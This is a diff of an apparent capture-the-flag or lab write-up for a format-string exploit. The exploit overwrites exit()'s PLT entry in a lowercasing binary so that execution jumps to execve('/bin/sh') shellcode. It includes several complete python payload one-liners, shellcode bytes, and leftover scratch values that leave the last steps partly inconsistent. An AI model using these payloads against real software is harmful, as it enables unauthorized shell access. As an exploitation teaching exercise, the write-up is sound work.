@@ -1,64 +1,142 @@
 
+# Overview
 
-[shellcode][target][formatting garbage]
+This binary takes an input string, de-capitalizes it (A-Z->a-z) and calls printf() with this string.
 
+# Vulnerability
 
+There is an unprotected printf() that can read and write to anywhere in the memory.
 
+# Exploit
 
+- We cannot use a ret-2-libc exploit here, because there is no return(), exit() is called directly.
 
-0xffffd69c <- shellcode begin
-0xffffd698 <- exit (0x080497e0)
+- We can, however, overwrite exit()'s address in the memory (PLT, process linkage table).
 
+# Payload design
 
-val1 val2 = 0xffffd69c
+Considerations:
 
-ffff
--4 - 30
+1. Shellcode needs to be at a predictable address.
+2. We also need to put the destination address somewhere close to the beginning of the input string
 
-val 1 = 54902
+Result:
+[destination address] [printf conversions] [shellcode]
 
-val 2 = 10595
+# Payload development
 
-d69c
+## Printf aiming
 
-[target adress][formatting madness][shellcode begins]
+First, let's make printf target the first 8 bytes of the string:
 
-%140x%10$hn%140x%11$hn
+"aaaabbbb %p %p %p %p..." put %p's or %42$p's until %p gives you 61616161 62626262
 
+You can see from the source that the string is at $esp + 0x28 (dec 40), so it should be around 10th %p or %10$p.
 
+Now we know that the payload is going to be something around:
 
-final
-[target][shellcode][garbage]
+[target address][inflating printf return][highest byte write][inflating more][lowest byte write]
+aaaa bbbb       %4242x                   %10$hn              %4242x          %11$hn
 
-val 1
-val 2
+## Finding out the address of the shellcode
 
-
-
-
-import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "%54902x%10$hn%10595x%11$hn"
-
-import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54902x%10$hn%10595x%11$hn0\x00" + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-
-import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54964x%10$hn%10563x%11$hn0\x00" + "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81")
-
-
-%54902x%10$pz%10595x%11$pz
-
-%54964x%10$hn%10563x%11$hn0z
-
-%54964x%10$hn%10563x%11$hn0z
-aaaaaaaaaaaaaaaaaaaaaaaaaaaa
-
-0xffffdde4
+Let's now roughly construct the payload string, so that we can find out the address we're going to redirect to.
 
 
-56796
+-------------------------------------------------------------------| this is what we're going to be looking for 
+                                                                   \/
+python -c 'print("aaaabbbb" + "%4242x %10$hn %4242x %11$hn " + "ccccdddd")' > /tmp/e5
 
-8731
+Break at *main+195 and run < /tmp/e5
 
-import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%56802x%10$hn%8725x%11$hn\x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
+With this we seem to land at 0xffffd67c
 
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+## Finding the address of exit() in PLT
 
-import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%55515x%10$hn%10012x%11$hn\x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
+Either look up the PLT in using objdump -R (for -Relocation records), or look around in gdb.
+
+The target is: 
+
+0x080497e0
+
+## What we know now
+
+----------------------------------------------|   address of exit in PLT (target), first two bytes, then two more bytes
+                                              \/
+python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%4242x %10$hn %4242x %11$hn " + "ccccdddd")' > /tmp/e5
+                                                                                               /\
+-----------------------------------------------------------------------------------------------|    this (value) not known yet
+
+## Let's calculate the printf value
+
+The value we want to write is 0xffffd67c. We want to write it in two chunks:
+
+0xd67c and 0xffff
+
+We've given printf two targets (exit's lower 2 bytes and higher two bytes).
+
+The first value is the lower bytes, 0xd67c. We need to inflate printf's return to this value.
+
+By the time we reach the conversions, we've already written 8 bytes (two 4-byte addresses).
+
+So the value should be 0xd67c - 8 = 54900
+
+By the time we reach the second conversion, we've already written the first value (0xd67c, or 54900), so we need to inflate
+the return value to 0xffff - 54900 or 0xffff - 0xd67c = 10627
+
+
+## What do we have now
+python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54900x %10$hn %10627x %11$hn " + "ccccdddd")' > /tmp/e5
+
+
+## Add shellcode
+
+Let's try this one:  https://shell-storm.org/shellcode/files/shellcode-575.html
+
+
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+
+
+## Tailor the address
+
+Now that we have an almost-ready payload, go to gdb again and make sure your target value is still aiming at the first byte of the shellcode.
+
+## Understand that life is pain
+
+Now we remember that the code will de-capitalize (change) all bytes in your shellcode between 41 and 5a.
+
+## Find hope again
+
+Remember that the code uses strlen so it will stop at \0. Isolate your shellcode with a \x00, and add two spaces for good measure.
+
+## Result
+
+python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54900x%10$hn%10627x%11$hn  \x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/e5
+
+## Tweak again
+
+If you look at gdb now, and 
+
+```
+unset env LINES
+unset env COLUMNS
+```
+
+0xffffddcb
+
+
+the shellcode now lives at 0xffffd67f. We need to tweak the first printf inflation value:
+
+0xffffd69d
+
+value1 = 0xd69d - 8 = 54901
+1
+value2 = 0xffff - 0xd69d = 10594
+
+## Final result, I promise
+
+56802
+
+8725
+
+python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54879x%10$hn%10596x%11$hn\x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/e5
